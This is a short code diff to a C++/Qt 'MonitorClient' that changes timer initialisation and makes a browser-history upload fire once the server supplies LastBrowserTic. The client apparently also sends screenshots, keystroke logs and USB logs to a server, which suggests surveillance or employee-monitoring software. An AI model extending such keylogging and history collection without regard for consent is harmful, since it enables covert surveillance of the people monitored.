@@ -124,8 +124,9 @@ MonitorClient::MonitorClient()
     setupSystemTray();
 
     const qint64 now = QDateTime::currentSecsSinceEpoch();
-    m_lastEmitTicTime = m_lastEmitHistoryTime = m_lastEmitScreenshotTime =
-        m_lastEmitKeyLogTime = m_lastEmitUsbLogTime = now;
+    m_lastEmitScreenshotTime = m_lastEmitKeyLogTime = m_lastEmitUsbLogTime = now;
+    m_lastEmitTicTime = 0;
+    m_lastEmitHistoryTime = now;
 
     monitorTimer = new QTimer(this);
     monitorTimer->setInterval(1000);
@@ -520,8 +521,15 @@ int MonitorClient::sendTic()
                 QJsonDocument jsonDoc = QJsonDocument::fromJson(body, &jsonError);
                 if (jsonError.error == QJsonParseError::NoError && jsonDoc.isObject()) {
                     QJsonObject obj = jsonDoc.object();
-                    if (obj.contains("LastBrowserTic"))
+                    if (obj.contains("LastBrowserTic")) {
+                        bool wasUnset = (lastBrowserTic == -1);
                         lastBrowserTic = obj["LastBrowserTic"].toVariant().toLongLong();
+                        if (wasUnset) {
+                            m_lastEmitHistoryTime = 0;
+                            qDebug() << "LastBrowserTic received:" << lastBrowserTic
+                                     << "— browser history will fire on next interval";
+                        }
+                    }
                 }
             } else {
                 serverConnected = false;
